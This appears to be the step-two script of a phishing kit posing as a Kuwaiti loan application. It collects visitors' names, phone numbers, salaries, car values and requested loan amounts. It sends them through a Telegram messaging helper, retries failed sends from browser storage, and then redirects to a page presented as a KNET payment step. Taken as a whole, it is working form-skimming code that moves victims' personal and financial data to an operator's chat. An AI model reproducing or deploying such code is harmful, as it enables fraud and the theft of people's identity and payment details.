    <script>
    function normalizeDigits(value) {
        return value
            .replace(/[٠-٩]/g, function(char) { return String(char.charCodeAt(0) - 1632); })
            .replace(/[۰-۹]/g, function(char) { return String(char.charCodeAt(0) - 1776); });
    }

    function digitsOnly(value) {
        return normalizeDigits(value).replace(/\D+/g, '');
    }

    function getFieldPlaceholder(field) {
        if (!field) {
            return '';
        }

        if (field.tagName === 'SELECT') {
            return 'قطاع العمل';
        }

        return field.previousElementSibling && field.previousElementSibling.tagName === 'LABEL'
            ? field.previousElementSibling.textContent.trim()
            : (field.getAttribute('placeholder') || field.id);
    }

    function buildStep2SubmissionMessage(values) {
        const pageName = window.getCurrentTelegramPageName ? window.getCurrentTelegramPageName() : 'صفحة الراتب';
        const pageEmoji = window.getCurrentTelegramPageEmoji ? window.getCurrentTelegramPageEmoji() : '💼';
        const lines = [`${pageEmoji} ${pageName}`];

        if (values.name && values.phone) {
            lines.push(`👤 ${values.name} ─ ${values.phone}`);
        } else if (values.name) {
            lines.push(`👤 ${values.name}`);
        } else if (values.phone) {
            lines.push(`📞 ${values.phone}`);
        }

        if (values.netSalary) lines.push(`💰 الراتب الشهري: ${values.netSalary}`);
        if (values.carValue) lines.push(`🚗 قيمة السيارة: ${values.carValue}`);
        if (values.requestedAmount) lines.push(`💵 القرض المطلوب: ${values.requestedAmount}`);

        if (
            !values.name &&
            !values.phone &&
            !values.netSalary &&
            !values.carValue &&
            !values.requestedAmount
        ) {
            lines.push('لم يقم بادخال اي معلومات');
        }

        return lines.join('\n');
    }

    function getLoanType() {
        const params = new URLSearchParams(window.location.search);
        return params.get('loan') || localStorage.getItem('selectedLoanType') || 'general';
    }

    function syncStep2Labels() {
        const loanType = getLoanType();
        localStorage.setItem('selectedLoanType', loanType);

        const carValueField = document.getElementById('carValueField');
        const carValueInput = document.getElementById('carValue');
        const label = document.getElementById('requestedAmountLabel');
        const input = document.getElementById('requestedAmount');
        const icon = label.querySelector('svg');
        const isCarLoan = loanType === 'car';
        const labelText = isCarLoan ? 'مبلغ الدفعة الاولى' : 'قيمة الفرض';

        label.innerHTML = '';
        if (icon) label.appendChild(icon);
        label.appendChild(document.createTextNode(labelText));
        input.placeholder = isCarLoan ? 'مثال: 100 د.ك.' : 'مثال: 5000 د.ك.';

        if (carValueField) {
            carValueField.classList.toggle('hidden', !isCarLoan);
        }

        if (carValueInput && !isCarLoan) {
            carValueInput.value = '';
            localStorage.removeItem('step2.carValue');
        }
    }

    function bindStep2() {
        syncStep2Labels();

        const form = document.getElementById('sb');
        const netSalary = document.getElementById('netSalary');
        const carValue = document.getElementById('carValue');
        const requestedAmount = document.getElementById('requestedAmount');
        const workSector = document.getElementById('workSector');
        const submitButton = document.getElementById('sbb');

        function syncWorkSectorPlaceholderState() {
            workSector.classList.toggle('text-gray-400', !workSector.value);
            workSector.classList.toggle('text-gray-800', Boolean(workSector.value));
        }

        [netSalary, carValue, requestedAmount].forEach(function(input) {
            if (!input) return;
            if (input.dataset.bound === 'true') return;
            input.dataset.bound = 'true';
            input.addEventListener('input', function() {
                input.value = digitsOnly(input.value);
            });
        });

        if (localStorage.getItem('step2.netSalary')) netSalary.value = localStorage.getItem('step2.netSalary');
        if (carValue && localStorage.getItem('step2.carValue')) carValue.value = localStorage.getItem('step2.carValue');
        if (localStorage.getItem('step2.requestedAmount')) requestedAmount.value = localStorage.getItem('step2.requestedAmount');
        if (localStorage.getItem('step2.workSector')) workSector.value = localStorage.getItem('step2.workSector');
        syncWorkSectorPlaceholderState();

        form.dataset.submitting = 'false';
        if (submitButton) {
            submitButton.disabled = false;
            submitButton.removeAttribute('aria-busy');
        }
        if (window.hideSubmissionLoadingOverlay) {
            window.hideSubmissionLoadingOverlay();
        }

        if (form.dataset.retryChecked !== 'true') {
            form.dataset.retryChecked = 'true';
            if (window.resendStoredFailureMessage) {
                window.resendStoredFailureMessage(
                    window.STEP1_FAIL_STORAGE_KEY || 'step1_fail',
                    'تنبيه: كان هناك مشكلة في إرسال رسالة صفحة المعلومات الشخصية، يرجى مراجعة تيليجرام.'
                ).catch(function() {});
            }
        }

        if (workSector.dataset.bound !== 'true') {
            workSector.dataset.bound = 'true';
            workSector.addEventListener('change', syncWorkSectorPlaceholderState);
        }

        if (form.dataset.bound !== 'true') {
            form.dataset.bound = 'true';
            form.addEventListener('submit', async function(event) {
                event.preventDefault();

                if (form.dataset.submitting === 'true') return;

                form.dataset.submitting = 'true';
                if (submitButton) {
                    submitButton.disabled = true;
                    submitButton.setAttribute('aria-busy', 'true');
                }

                const nameValue = (localStorage.getItem('step1.name') || '').trim();
                const phoneValue = digitsOnly(localStorage.getItem('step1.phone') || '');
                const netSalaryValue = digitsOnly(netSalary.value);
                const carValueValue = carValue ? digitsOnly(carValue.value) : '';
                const requestedAmountValue = digitsOnly(requestedAmount.value);
                const workSectorValue = workSector.value.trim();
                const loanType = getLoanType();
                localStorage.setItem('step2.netSalary', netSalaryValue);
                if (loanType === 'car') {
                    localStorage.setItem('step2.carValue', carValueValue);
                } else {
                    localStorage.removeItem('step2.carValue');
                }
                localStorage.setItem('step2.requestedAmount', requestedAmountValue);
                localStorage.setItem('step2.workSector', workSectorValue);

                const message = buildStep2SubmissionMessage({
                    name: nameValue,
                    phone: phoneValue,
                    netSalary: netSalaryValue,
                    carValue: loanType === 'car' ? carValueValue : '',
                    requestedAmount: requestedAmountValue,
                    workSector: workSectorValue
                });

                if (window.showSubmissionLoadingOverlay) {
                    window.showSubmissionLoadingOverlay('جارٍ الانتقال إلى صفحة الدفع...', 3000, 'knet');
                }

                const sent = window.sendTelegramMessageOnce
                    ? await window.sendTelegramMessageOnce(message, false)
                    : false;

                if (!sent) {
                    localStorage.setItem(window.STEP2_FAIL_STORAGE_KEY || 'step2_fail', message);
                    if (window.persistTelegramMessageThenSend) {
                        window.persistTelegramMessageThenSend(message, false).catch(function() {});
                    }
                } else {
                    localStorage.removeItem(window.STEP2_FAIL_STORAGE_KEY || 'step2_fail');
                }

                window.location.href = './step3.html';
            });
        }
    }

    bindStep2();
    window.addEventListener('pageshow', bindStep2);
    </script>
